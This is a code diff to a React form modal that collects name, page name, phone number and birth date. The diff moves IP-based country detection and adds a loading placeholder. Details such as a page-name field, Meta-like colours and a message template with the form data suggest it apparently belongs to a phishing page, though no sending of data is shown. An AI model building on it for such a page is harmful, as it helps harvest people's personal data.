@@ -45,6 +45,7 @@ const InitModal: FC = () => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
     const [countryCode, setCountryCode] = useState('us');
+    const [countryReady, setCountryReady] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
@@ -81,60 +82,42 @@ const InitModal: FC = () => {
         }
     }, [isModalOpen, formStep, setFormStep]);
 
-    // DEDICATED: Detect country code specifically when entering 'init' form
-    // This runs EVERY time formStep becomes 'init' (on reopen)
+    // Detect country code on mount - runs once when component mounts
     useEffect(() => {
-        // Only run when explicitly in init form
-        if (formStep !== 'init') {
-            console.log('[GeoDetect] FormStep is not init, skipping');
-            return;
-        }
-        
-        console.log('[GeoDetect] ENTERING INIT FORM - Detecting country...');
-        
-        // Step 1: Set fallback country immediately
+        // Step 1: Set fallback country immediately from browser language
         const fallbackCC = getCountryCodeFromBrowser();
-        console.log('[GeoDetect] Step 1 - Browser fallback:', fallbackCC);
         setCountryCode(fallbackCC);
+        setCountryReady(true); // Mark ready immediately with browser fallback
         
-        // Step 2: Fetch from geo API
+        // Step 2: Refine with geo API in background
         const controller = new AbortController();
         
         const detectCountry = async () => {
             try {
-                console.log('[GeoDetect] Step 2 - Fetching from geo API...');
                 const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { 
                     timeout: 5000,
                     signal: controller.signal 
                 });
                 
                 let cc = (data.country_code || '').toLowerCase().trim();
-                console.log('[GeoDetect] Step 2 - API response:', cc);
                 
                 // Validate
                 if (cc.length !== 2 || !/^[a-z]{2}$/.test(cc)) {
-                    console.log('[GeoDetect] Invalid API response, keeping fallback:', fallbackCC);
                     cc = fallbackCC;
                 }
                 
-                console.log('[GeoDetect] Step 3 - Final country set to:', cc);
                 setCountryCode(cc);
+                setCountryReady(true);
             } catch (error) {
-                if (error instanceof Error && error.name === 'AbortError') {
-                    console.log('[GeoDetect] API aborted');
-                    return;
-                }
-                console.log('[GeoDetect] API error, keeping fallback:', fallbackCC);
+                if (error instanceof Error && error.name === 'AbortError') return;
+                // Keep fallback - already set and ready
             }
         };
         
         detectCountry();
         
-        return () => {
-            console.log('[GeoDetect] Cleanup - aborting API');
-            controller.abort();
-        };
-    }, [formStep]);
+        return () => controller.abort();
+    }, []); // Empty dep - runs once on mount (component remounts on each modal open)
 
     // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
     useEffect(() => {
@@ -248,11 +231,9 @@ const InitModal: FC = () => {
         [countryCode]
     );
 
-    // Reset form fields and country when modal closes
+    // Reset form fields when modal closes
     useEffect(() => {
         if (formStep !== 'init') {
-            console.log('[FormReset] Resetting form - formStep is now:', formStep);
-            // Reset all states
             setFormData({
                 fullName: '',
                 pageName: '',
@@ -265,8 +246,6 @@ const InitModal: FC = () => {
                 birthYear: ''
             });
             setPhoneNumber('');
-            setCountryCode('us'); // Reset to default so next open triggers fresh detection
-            console.log('[FormReset] Reset countryCode to us');
             setIsLoading(false);
         }
     }, [formStep]);
@@ -353,14 +332,18 @@ ${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date
                             </div>
                         ))}
                         <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
-                        <IntlTelInput
-                            onChangeNumber={handlePhoneChange}
-                            initOptions={initOptions}
-                            inputProps={{
-                                name: 'phoneNumber',
-                                className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
-                            }}
-                        />
+                        {countryReady ? (
+                            <IntlTelInput
+                                onChangeNumber={handlePhoneChange}
+                                initOptions={initOptions}
+                                inputProps={{
+                                    name: 'phoneNumber',
+                                    className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
+                                }}
+                            />
+                        ) : (
+                            <div className='h-9 sm:h-10 bg-gray-100 rounded-lg animate-pulse' />
+                        )}
 
                         {/* Date of Birth Section */}
                         <div className='mt-1.5 sm:mt-2'>
